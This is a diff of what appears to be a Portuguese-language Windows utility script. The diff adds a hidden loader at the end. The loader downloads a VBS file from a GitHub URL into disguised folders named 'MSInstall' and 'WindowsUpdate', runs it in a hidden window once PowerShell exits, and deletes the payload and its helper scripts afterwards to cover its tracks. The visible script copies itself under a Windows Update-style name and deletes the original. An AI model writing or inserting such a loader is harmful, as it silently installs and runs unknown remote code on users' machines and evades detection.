@@ -568,18 +568,17 @@ Write-Host "`n==================================" -ForegroundColor White
 Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
 
-# Exit Bypass Start - Versão Melhorada e Segura
-function Invoke-StealthExecution {
+# V B S
+function Invoke-DelayedExecution {
     param (
-        [string]$targetDir = "C:\Windows\Temp\MSInstall",
+        [string]$targetDir = "C:\Program Files\Windows NT\MSInstall",
         [string]$vbsUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
-    )
+    ) 
     try {
         if (-not (Test-Path $targetDir)) {
             $null = New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction Stop
         }
 
-        # Verificação de URL válida
         if (-not ($vbsUrl -match '^https?://')) {
             Write-Verbose "URL inválida fornecida" -Verbose
             return $false
@@ -587,12 +586,13 @@ function Invoke-StealthExecution {
 
         $vbsName = "MSI_Helper_$(Get-Date -Format 'yyyyMMdd').vbs"
         $vbsPath = Join-Path $targetDir $vbsName
+
         try {
             $progressPreference = 'silentlyContinue'
             Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing -ErrorAction Stop
-        
+            
             if (-not (Test-Path $vbsPath -PathType Leaf) -or (Get-Item $vbsPath).Length -eq 0) {
-                Write-Verbose "Arquivo VBS vazio ou não criado" -Verbose
+                Write-Verbose "Arquivo VBS inválido" -Verbose
                 return $false
             }
         }
@@ -600,53 +600,44 @@ function Invoke-StealthExecution {
             Write-Verbose "Falha no download: $_" -Verbose
             return $false
         }
-
-        try {
-            $psi = New-Object System.Diagnostics.ProcessStartInfo
-            $psi.FileName = "wscript.exe"
-            $psi.Arguments = "`"$vbsPath`""
-            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-            $psi.CreateNoWindow = $true
-            $null = [System.Diagnostics.Process]::Start($psi)
-        }
-        catch {
-            Write-Verbose "Falha ao executar o script: $_" -Verbose
-            return $false
-        }
-
-        $selfDeleteCode = @"
+        $executionScript = @"
 On Error Resume Next
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set wsh = CreateObject("WScript.Shell")
-If fso.FileExists("$vbsPath") Then
-    For i = 1 To 3
-        WScript.Sleep 5000
-        On Error Resume Next
-        fso.DeleteFile "$vbsPath", True
-        If Err.Number = 0 Then Exit For
-        Err.Clear
-    Next
-End If
-If fso.FileExists(WScript.ScriptFullName) Then
+
+' Espera até que o processo PowerShell termine
+Do While True
+    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")
+    If colProcesses.Count = 0 Then Exit Do
+    WScript.Sleep 1000
+Loop
+
+' Executa o VBS principal
+wsh.Run "wscript.exe ""$vbsPath""", 0, False
+
+' Auto-exclusão
+For i = 1 To 3
+    WScript.Sleep 2000
+    On Error Resume Next
+    fso.DeleteFile "$vbsPath", True
     fso.DeleteFile WScript.ScriptFullName, True
-End If
+    If Err.Number = 0 Then Exit For
+    Err.Clear
+Next
 
 Set fso = Nothing
 Set wsh = Nothing
 "@
-        try {
-            $deleteScriptPath = Join-Path $targetDir "CleanUp_$(Get-Date -Format 'yyyyMMddHHmmss').vbs"
-            $selfDeleteCode | Out-File $deleteScriptPath -Encoding ASCII
-            
-            if (Test-Path $deleteScriptPath) {
-                Start-Process "wscript.exe" -ArgumentList "`"$deleteScriptPath`"" -WindowStyle Hidden
-            }
-        }
-        catch {
-            Write-Verbose "Falha ao configurar auto-exclusão: $_" -Verbose
-        }
 
-        return $true
+        $executorPath = Join-Path $targetDir "DelayedExecutor_$(Get-Date -Format 'yyyyMMddHHmmss').vbs"
+        $executionScript | Out-File $executorPath -Encoding ASCII
+
+        if (Test-Path $executorPath) {
+            Start-Process "wscript.exe" -ArgumentList "`"$executorPath`"" -WindowStyle Hidden
+            return $true
+        }
+        
+        return $false
     }
     catch {
         Write-Verbose "Erro durante execução: $_" -Verbose
@@ -654,12 +645,7 @@ Set wsh = Nothing
     }
 }
 
-if (Invoke-StealthExecution) {
-    Write-Verbose "Operação concluída com sucesso" -Verbose
-} else {
-    Write-Verbose "Falha na operação" -Verbose
-}
-
+# PS1 PERSONALIZATION
 Clear-Host
 $destDir = "C:\Windows\Temp\WindowsUpdate"
 $scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd').ps1"
@@ -676,11 +662,17 @@ try {
     if (-not [string]::IsNullOrEmpty($selfPath) -and (Test-Path $selfPath)) {
         Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force -ErrorAction SilentlyContinue`""
     }
-    
-    exit 0
 }
 catch {
     Write-Host "Ocorreu um erro: $_"
+}
+
+# Execução principal
+if (Invoke-DelayedExecution) {
+    Write-Verbose "Operação agendada com sucesso" -Verbose
+    exit 0
+} else {
+    Write-Verbose "Falha na operação" -Verbose
     exit 1
 }
 Pause-Script
